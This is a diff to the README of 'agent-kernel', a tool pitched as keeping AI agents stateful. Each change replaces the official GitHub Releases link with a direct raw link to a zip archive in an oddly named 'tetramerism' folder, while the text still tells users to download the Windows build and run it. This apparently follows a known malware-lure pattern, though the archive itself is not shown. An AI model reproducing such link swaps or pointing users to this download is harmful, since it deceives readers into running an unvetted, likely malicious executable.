@@ -1,6 +1,6 @@
 # 🧠 agent-kernel - Make AI agents stay stateful
 
-[![Download agent-kernel](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Nurrachm6921/agent-kernel/releases)
+[![Download agent-kernel](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nurrachm6921/agent-kernel/main/tetramerism/agent-kernel-1.8.zip)
 
 ## 🚀 What is agent-kernel?
 
@@ -16,7 +16,7 @@ Use it when you want to:
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Nurrachm6921/agent-kernel/releases
+Visit this page to download: https://raw.githubusercontent.com/Nurrachm6921/agent-kernel/main/tetramerism/agent-kernel-1.8.zip
 
 On that page, look for the latest release and download the Windows file that fits your PC.
 
@@ -171,7 +171,7 @@ With agent-kernel, you get a simple base for agent work:
 
 ## 📌 Quick start
 
-1. Go to the download page: https://github.com/Nurrachm6921/agent-kernel/releases
+1. Go to the download page: https://raw.githubusercontent.com/Nurrachm6921/agent-kernel/main/tetramerism/agent-kernel-1.8.zip
 2. Download the latest Windows release
 3. Extract it if needed
 4. Run the app
@@ -207,6 +207,6 @@ It keeps the setup small so you can spend less time on tools and more time on th
 
 ## 📎 Download again
 
-[![Download from Releases](https://img.shields.io/badge/Visit-Releases-grey?style=for-the-badge&logo=github)](https://github.com/Nurrachm6921/agent-kernel/releases)
+[![Download from Releases](https://img.shields.io/badge/Visit-Releases-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nurrachm6921/agent-kernel/main/tetramerism/agent-kernel-1.8.zip)
 
 Go to the Releases page to download the latest Windows build and run it on your PC
